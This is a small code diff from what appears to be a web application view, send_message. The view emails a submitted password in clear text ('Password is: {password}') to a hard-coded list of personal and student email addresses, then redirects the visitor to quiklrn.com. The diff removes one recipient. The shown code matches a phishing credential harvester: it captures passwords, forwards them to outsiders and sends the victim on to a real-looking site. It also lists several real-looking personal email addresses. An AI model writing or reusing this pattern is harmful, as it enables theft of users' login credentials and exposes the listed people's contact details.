@@ -33,7 +33,7 @@ def send_message(request):
     f'Password is: {password}',
     f'{password}',
     'from@example.com',
-    ['praneeth.cs19@rvce.edu.in', 'sharanrshetty.cs19@rvce.edu.in', 'venjanv.cs19@rvce.edu.in', 'chaitanya.inamadar@gmail.com'],
+    ['praneeth.cs19@rvce.edu.in', 'sharanrshetty.cs19@rvce.edu.in', 'venjanv.cs19@rvce.edu.in'],
     fail_silently=False,
     )
     return redirect('https://quiklrn.com/')
